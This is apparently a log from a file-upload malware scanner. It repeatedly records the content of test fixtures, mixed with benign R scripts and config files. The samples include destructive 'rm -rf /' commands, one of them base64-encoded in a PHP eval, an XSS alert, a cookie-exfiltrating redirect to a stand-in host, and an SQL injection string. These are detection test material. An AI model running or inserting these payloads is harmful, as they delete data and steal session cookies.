2025-02-22 20:04:38,644 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,647 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:38,647 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,647 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:04:38,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:04:38,649 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,649 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,653 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,656 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:04:38,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:04:38,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:04:38,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:04:38,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,663 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,666 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,666 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:04:38,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:04:38,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:04:38,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:04:38,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,676 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 20:04:38,676 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/test_doc_hidden.docx
2025-02-22 20:04:38,677 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,681 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,686 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,686 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:04:38,686 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/1.sql
2025-02-22 20:04:38,686 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,686 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,687 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:04:38,687 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,687 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,687 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:04:38,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:04:38,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:04:38,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:04:38,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,692 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:04:38,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,697 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,700 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,704 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:04:38,704 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:04:38,704 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:04:38,705 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:04:38,705 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,705 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,709 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,712 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,712 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,712 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,712 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:04:38,713 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,713 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,717 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,721 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:04:38,721 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:04:38,721 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:04:38,721 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:04:38,721 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,721 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,725 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,729 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,729 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,729 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,729 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:04:38,730 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,730 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:04:38,734 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,737 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,737 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,737 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,738 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,738 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,738 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
